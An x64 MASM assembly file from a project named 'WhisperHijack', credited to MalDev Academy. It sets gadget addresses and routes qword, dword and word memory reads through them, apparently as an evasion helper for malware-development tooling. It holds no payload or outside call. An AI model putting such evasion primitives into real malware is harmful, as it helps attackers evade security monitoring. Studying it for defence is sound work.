; Copyright 2026 MalDev Academy
; WhisperHijack - Licensed under the Apache License, Version 2.0 (the "License")
; https://github.com/Maldev-Academy/WhisperHijack

.data

    g_qGadgetQwordAddress       QWORD 0h
    g_qGadgetDwordAddress       QWORD 0h
    g_qGadgetWordAddress        QWORD 0h

.code 

;;

SetGadget PROC

	mov g_qGadgetQwordAddress,	rcx
    mov g_qGadgetDwordAddress,	rdx
    mov g_qGadgetWordAddress,   r8
	ret

SetGadget ENDP

;;

ReadQwordViaGadget PROC
    mov  rdx, g_qGadgetQwordAddress
    test rdx, rdx
    jz   NO_QWORD_GADGET

    mov  rax, rcx
    jmp  rdx

NO_QWORD_GADGET:
    mov  rax, [rcx]
    ret
ReadQwordViaGadget ENDP

;;

ReadDwordViaGadget PROC
    mov  rdx, g_qGadgetDwordAddress
    test rdx, rdx
    jz   NO_DWORD_GADGET

    mov  rax, rcx
    jmp  rdx

NO_DWORD_GADGET:
    jmp  ReadQwordViaGadget
ReadDwordViaGadget ENDP

;;

ReadWordViaGadget PROC
    mov  rdx, g_qGadgetWordAddress
    test rdx, rdx
    jz   NO_WORD_GADGET

    mov  rax, rcx
    jmp  rdx

NO_WORD_GADGET:
    jmp  ReadDwordViaGadget
ReadWordViaGadget ENDP

;;

end


